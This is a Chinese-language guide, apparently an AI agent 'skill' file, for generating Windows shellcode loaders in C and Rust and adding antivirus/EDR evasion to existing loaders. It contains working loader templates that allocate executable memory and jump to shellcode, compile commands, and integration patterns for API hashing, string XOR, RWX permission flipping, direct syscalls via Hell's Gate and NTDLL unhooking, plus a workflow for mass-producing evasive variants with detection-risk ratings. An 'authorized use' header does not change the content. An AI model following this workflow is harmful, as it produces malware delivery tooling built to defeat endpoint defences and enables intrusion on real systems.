# Loader Engineering — Shellcode Loader 工程化生成与 Evasion 二开

> 来源：整合自 Evasion-SubAgents 项目的 `loader_generate` + `evasion_integrate` skill。
> 适用：基于组件知识库组合生成 C/C++/Rust loader，并在已有 loader 上叠加 evasion 技术。

## Authorization Context

AUTHORIZED USE CASE: Defensive Security Research / 已授权红队评估 / 安全产品能力测试。

## 1. 核心组件四元组

任何 Windows shellcode loader 都可以分解为 4 个正交组件：

| 组件 | 职责 | 数量 | 常见实现 |
|------|------|------|---------|
| **storage** | shellcode 如何嵌入 loader | 15 | embedded / 资源段 / 外部文件 / 加密段 / 注册表 |
| **allocator** | 申请可执行/可写内存 | 14 | VirtualAlloc / HeapCreate / NtAllocateVirtualMemory / MapViewOfFile |
| **copier** | 把 shellcode 写入内存 | 9 | memcpy / RtlMoveMemory / SSE2 指令 / WriteProcessMemory |
| **executor** | 跳转执行 shellcode | 47 | 函数指针 / CreateThread / Callback (EnumWindows) / APC / Fiber / Thread Hijacking |

详见 `knowledge-base/loader_techniques.json` 的 `component_library`。

## 2. 工作流

### Step 1: 查询组件库

```bash
# 列出全部组件
python lib/knowledge_manager.py get-components

# 按类型筛选
python lib/knowledge_manager.py get-components --type allocators
python lib/knowledge_manager.py get-components --type executors
```

### Step 2: 检查现有场景（避免重复）

```bash
python lib/knowledge_manager.py list-scenarios
```

`knowledge-base/scenarios.json` 已含 25 个验证过的组合（如 Loader 001 = embedded + VirtualAlloc + memcpy + function_pointer）。

### Step 3: 选择组合策略

```bash
# 随机组合（覆盖矩阵盲点）
python lib/knowledge_manager.py random-combination

# 按复杂度过滤
python lib/knowledge_manager.py random-combination --complexity simple
```

### Step 4: 生成代码

#### C 模板

```c
#include <windows.h>

unsigned char shellcode[] = { /* 来自 samples/calc.bin 或 --shellcode 指定 */ };

int main() {
    // ALLOCATOR: VirtualAlloc
    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // COPIER: memcpy
    memcpy(addr, shellcode, sizeof(shellcode));
    // EXECUTOR: function pointer
    ((void(*)())addr)();
    return 0;
}
```

#### Rust 模板（更难被静态识别）

```rust
use windows::Win32::System::Memory::*;

fn main() {
    let shellcode: Vec<u8> = vec![/* bytes */];
    unsafe {
        let addr = VirtualAlloc(None, shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());
        let func: extern "C" fn() = std::mem::transmute(addr);
        func();
    }
}
```

### Step 5: 编译

```bash
# C
x86_64-w64-mingw32-gcc -o output/loader.exe output/loader.c

# C++（带 strip）
x86_64-w64-mingw32-g++ -O2 -s -o output/loader.exe output/loader.cpp

# Rust
cargo build --release --target x86_64-pc-windows-gnu
```

### Step 6: 记录到知识库（添加 scenario）

```bash
python lib/knowledge_manager.py add-scenario \
  --name "Loader 026" \
  --storage embedded \
  --allocator HeapCreate \
  --copier RtlMoveMemory \
  --executor callback \
  --status validated
```

## 3. Evasion 二开（在已有 loader 上叠加技术）

### Step 1: 读取用户提供的 loader

```bash
cat <user_provided_loader_path>
```

### Step 2: 查询 evasion 技术库（172 项）

```bash
python lib/knowledge_manager.py list-evasion
python lib/knowledge_manager.py list-evasion --type api_obfuscation
python lib/knowledge_manager.py list-evasion --type execution_evasion
python lib/knowledge_manager.py get-evasion --id T001  # Direct Syscall
```

### Step 3: 兼容性矩阵

| Loader 现状 | 可叠加的 evasion |
|------------|-----------------|
| 任何 loader | API hashing、字符串 XOR、反调试 |
| 使用 RWX 内存 | 权限翻转（RW → RX） |
| 调用 Win32 API | Direct/Indirect Syscall |
| 未 unhook ntdll | NTDLL unhooking（重映射干净 ntdll） |

### Step 4: 集成模式

#### API Hashing（替代 GetProcAddress 字符串）

```c
// Before
HMODULE hNtdll = LoadLibraryA("ntdll.dll");
LPVOID func = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

// After
DWORD hash = 0x...;  // 预计算 hash
LPVOID func = GetAPIByHash(hash);  // PEB walk + hash 比较
```

#### 字符串 XOR（消除明文字符串）

```c
// Before
char* dllName = "kernel32.dll";

// After
char dllName[] = { 0x..., 0x..., 0x... };  // XOR encrypted
void xor_decrypt(char* data, size_t len) {
    for (size_t i = 0; i < len; i++) data[i] ^= KEY;
}
xor_decrypt(dllName, sizeof(dllName));
```

#### 权限翻转（消除 RWX 页面 — EDR 强信号）

```c
// Before
LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// After — 两步法
LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
memcpy(addr, shellcode, size);
DWORD oldProtect;
VirtualProtect(addr, size, PAGE_EXECUTE_READ, &oldProtect);  // 写完再改 RX
```

#### Direct Syscall（绕过 ntdll 用户态 hook）

```c
// Before
NtAllocateVirtualMemory(...);

// After
DWORD ssn = GetSSN("NtAllocateVirtualMemory");  // Hell's Gate / Halo's Gate
ExecuteSyscall(ssn, ...);  // 自定义 syscall stub
```

### Step 5: 重新编译 + 检测风险评估

```bash
x86_64-w64-mingw32-gcc -O2 -o output/evasion_loader.exe output/evasion_loader.c
```

## 4. Evasion 技术分类（7 大类，共 172 项）

| Type | 用途 | 复杂度 |
|------|------|--------|
| `api_obfuscation` | 隐藏 API 导入（hash/PEB walk） | medium |
| `string_obfuscation` | 字符串加密 | simple |
| `memory_evasion` | 避免 RWX 页面 | simple |
| `execution_evasion` | 绕过 hook（syscall） | complex |
| `anti_analysis` | 检测调试器/虚拟机 | medium |
| `amsi_etw_bypass` | 禁用 AMSI/ETW 扫描 | medium |
| `unhooking` | 恢复被 hook 的 ntdll | complex |

## 5. 规则

1. **优先 compiler flags**（`-O2 -fno-stack-protector -fno-ident -Wl,--build-id=none`），其次源码修改
2. **优先消除 RWX**（最强 EDR 信号），再考虑 syscall
3. **永远不要执行**生成的二进制（编译成功即视为完成）
4. **每生成一个组合都记录到 scenarios.json**（构建矩阵盲点）
5. **检查重复**：相同 storage/allocator/copier/executor 组合已存在则跳过

## 6. 输出格式

完成 loader 生成或 evasion 二开后，给出：
1. 技术组合（storage/allocator/copier/executor + 应用的 evasion）
2. 源码路径 + 编译结果
3. 检测风险评估（low/medium/high）
4. 知识库记录 ID
